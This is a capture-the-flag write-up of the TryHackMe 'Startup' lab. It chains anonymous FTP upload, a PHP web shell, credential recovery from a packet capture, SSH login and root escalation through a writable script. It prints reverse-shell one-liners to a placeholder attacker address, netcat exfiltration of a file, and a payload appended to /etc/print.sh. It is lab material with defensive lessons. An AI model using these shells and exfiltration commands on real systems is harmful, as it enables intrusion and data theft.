# Startup – Professional Write-up

**Platform:** TryHackMe
**Target OS:** Linux
**Attack Vector:** Misconfigured FTP → Web Shell → Credential Harvesting → Privilege Escalation

---

## Executive Summary

This machine demonstrates a realistic attack chain starting from exposed services and weak configurations, leading to full system compromise.

The exploitation path involved:

* Anonymous FTP access with upload capability
* Web shell deployment via exposed web directory
* Credential discovery inside a PCAP file
* Lateral movement via SSH
* Privilege escalation through writable script executed with elevated privileges

The engagement highlights the importance of secure service configuration, credential protection, and proper permission management.

---

# 1. Reconnaissance & Enumeration

A full TCP port scan was conducted to identify exposed services:

```bash
nmap -p- -Pn -n --min-rate 5000 -T4 <IP_TARGET>
```

Focused enumeration on discovered ports:

```bash
nmap -p21,22,80 -sSCV --min-rate 5000 -T4 <IP_TARGET>
```

### Identified Services

| Port | Service | Observation                             |
| ---- | ------- | --------------------------------------- |
| 21   | FTP     | Anonymous login enabled                 |
| 22   | SSH     | OpenSSH service                         |
| 80   | HTTP    | Web server hosting accessible directory |

The presence of anonymous FTP access immediately expanded the attack surface.

---

# 2. Initial Access – Anonymous FTP Abuse

Connection to FTP:

```bash
ftp <IP_TARGET> 21
Password: <ENTER>
ls
mget *
```

Key findings:

* Publicly accessible files
* Upload capability confirmed

This misconfiguration allowed arbitrary file upload, enabling remote code execution via web server.

---

# 3. Web Shell Deployment

A simple PHP reverse shell was created:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP_ATTACKER>/4444 0>&1'");
?>
```

Upload process:

```bash
ftp <IP_TARGET> 21
cd ftp
put shell.php
```

Listener setup:

```bash
nc -lvnp 4444
```

Shell execution via browser:

```
http://<IP_TARGET>/files/ftp/shell.php
```

Result: **Remote shell as web server user.**

---

# 4. Post-Exploitation & Internal Enumeration

From the obtained shell:

```bash
cat recipe.txt
```

Following lab hints, an unusual directory was identified:

```bash
cd /home/incidents
ls -la
```

File discovered:

```
suspicious.pcapng
```

---

# 5. PCAP Analysis & Credential Extraction

The file was exfiltrated using netcat.

**Attacker machine:**

```bash
nc -lvnp 9001 > suspicious.pcapng
```

**Victim machine:**

```bash
nc <IP_ATTACKER> 9001 < suspicious.pcapng
```

Basic analysis:

```bash
strings suspicious.pcapng | grep -i "password" -C 5
```

Cleartext credentials were recovered from captured network traffic.

This reflects a critical real-world issue: **unencrypted credential transmission.**

---

# 6. Lateral Movement – SSH Access

Direct privilege switching via `su` failed in the limited shell. Instead, SSH access was attempted using harvested credentials:

```bash
ssh lennie@<IP_TARGET>
```

Successful login.

User flag obtained:

```bash
cd /home/lennie
cat user.txt
```

---

# 7. Privilege Escalation

Enumeration revealed a script:

```bash
cd /scripts
cat planner.sh
```

The script referenced:

```
/etc/print.sh
```

Permissions review:

```bash
ls -la /etc/print.sh
```

The file was writable and executed by a privileged process.

---

## Exploitation of Writable Script

Listener preparation:

```bash
nc -lvnp 5555
```

Payload injection:

```bash
echo "bash -i >& /dev/tcp/<IP_ATTACKER>/5555 0>&1" >> /etc/print.sh
```

When executed by the privileged process, a root shell was obtained.

Verification:

```bash
whoami
```

Output:

```
root
```

Final flag:

```bash
cd /root
cat root.txt
```

---

# Technical Impact Assessment

This machine demonstrates multiple real-world security failures:

### 1. Service Misconfiguration

* Anonymous FTP with write permissions

### 2. Remote Code Execution

* Uploading executable PHP shell into web-accessible directory

### 3. Credential Exposure

* Cleartext credentials stored in network capture

### 4. Privilege Escalation via Weak File Permissions

* Writable script executed by privileged process

---

# Key Skills Demonstrated

* Full TCP enumeration with Nmap
* Service misconfiguration analysis
* Web shell deployment
* Reverse shell handling
* Network traffic artifact analysis
* Credential harvesting
* SSH pivoting
* Linux privilege escalation
* Manual exploitation without automated frameworks

---

# Conclusion

The compromise of the Startup machine illustrates how chained low-to-medium severity misconfigurations can lead to full system takeover.

From a defensive perspective, this scenario reinforces:

* The necessity of disabling anonymous FTP
* Restricting upload directories
* Enforcing encrypted protocols (e.g., SSH/SFTP instead of FTP)
* Proper file permission hardening
* Monitoring abnormal script modifications

This exercise reflects a realistic attacker mindset and demonstrates structured methodology applicable to real-world penetration testing engagements.

